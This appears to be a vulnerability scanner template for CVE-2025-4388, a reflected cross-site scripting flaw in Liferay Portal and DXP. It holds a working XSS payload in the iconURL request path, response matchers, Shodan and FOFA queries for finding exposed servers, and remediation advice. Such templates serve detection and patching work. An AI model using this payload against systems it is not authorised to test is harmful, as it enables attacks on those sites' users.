http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - sticker sticker-
    - <img src=x onerror=alert(document.domain)>
  - part: content_type
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/o/marketplace-app-manager-web/icon.jsp?iconURL=https:///%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E'
id: CVE-2025-4388
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cve-id: CVE-2025-4388
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
    cvss-score: 6.5
    cwe-id: CWE-79
    epss-percentile: 0.93875
    epss-score: 0.13137
  description: 'A reflected cross-site scripting (XSS) vulnerability in the Liferay
    Portal 7.4.0 through 7.4.3.131, and Liferay DXP 2024.Q4.0 through 2024.Q4.5, 2024.Q3.1
    through 2024.Q3.13, 2024.Q2.0 through 2024.Q2.13, 2024.Q1.1 through 2024.Q1.12,
    7.4 GA through update 92 allows an remote non-authenticated attacker to inject
    JavaScript into the modules/apps/marketplace/marketplace-app-manager-web.

    '
  impact: 'Attackers can execute arbitrary JavaScript in victim browsers through the
    iconURL parameter in the marketplace app manager, potentially leading to session
    hijacking and credential theft.

    '
  metadata:
    fofa-query: body="liferayPortalCSS"
    max-request: 1
    shodan-query: html:"liferayPortalCSS"
    verified: true
  name: Liferay Portal - Cross-Site Scripting
  reference:
  - https://liferay.dev/portal/security/known-vulnerabilities/-/asset_publisher/jekt/content/CVE-2025-4388
  - https://nvd.nist.gov/vuln/detail/CVE-2025-4388
  remediation: 'Upgrade Liferay Portal or DXP to the latest patched version that properly
    sanitizes the iconURL parameter.

    '
  severity: medium
  tags: cve,cve2025,liferay,marketplace,xss,vuln
